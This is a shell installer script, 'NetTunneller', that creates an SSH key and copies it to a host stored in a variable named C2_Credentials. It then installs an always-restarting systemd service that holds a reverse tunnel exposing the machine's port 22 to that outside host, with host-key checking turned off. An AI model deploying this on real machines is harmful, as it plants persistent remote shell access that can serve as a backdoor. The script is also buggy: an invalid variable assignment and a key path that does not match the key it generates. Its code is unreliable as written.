#!/bin/sh
die () {
    echo >&2 "$@"
    exit 1
}

# TODO Parse Args

[ "$#" -eq 2 ] || die "2 argument required, $# provided\n ./nettunneller-client <hostname>, <host port>"

echo 'NetTunneller Installer V3.0.0'
# echo 'DroneID: ' $1
echo 'Creating keys...'
sudo mkdir -p /etc/nettunneller
sudo ssh-keygen -qN "" -f /etc/nettunneller/nettunneller
sleep 10


C2_Credentials = "nettunneller@$1"

echo 'Sending Credentials...'
# ssh-copy-id -i ~/.ssh/id_rsa.pub -p [ServerSSH_IP] C2@ip TODO
sudo ssh-copy-id -i /etc/nettunneller/nettunneller.pub $C2_Credentials

#TODO
echo 'Creating service...'

if test -f "./nettunneller.service"; then
	sudo rm "./nettunneller.service"
fi

if test -f "/etc/systemd/system/nettunneller.service"; then
	sudo rm "/etc/systemd/system/nettunneller.service"
fi

port=$2

data="[Unit]
Description=Service to maintain an ssh reverse tunnel
Wants=network-online.target
After=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/usr/bin/ssh -qNn \
-o ServerAliveInterval=30 \
-o ServerAliveCountMax=3 \
-o ExitOnForwardFailure=yes \
-o StrictHostKeyChecking=no \
-o UserKnownHostsFile=/dev/null \
-o HostKeyAlgorithms=+ssh-rsa \
-i /etc/nettunneller/id_rsa \
-R $port:localhost:22 \
$C2_Credentials
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"

printf "$data" > nettunneller.service

# Add the service to start-up

sudo cp ./nettunneller.service /etc/systemd/system/nettunneller.service
sleep 5

sudo systemctl daemon-reload &
wait
sudo rm ./nettunneller.service

echo 'Enabling Service...'
sudo systemctl enable nettunneller
sleep 5


echo 'Starting Service...'
sudo systemctl start nettunneller
sleep 10

sudo systemctl status nettunneller

echo 'Done'
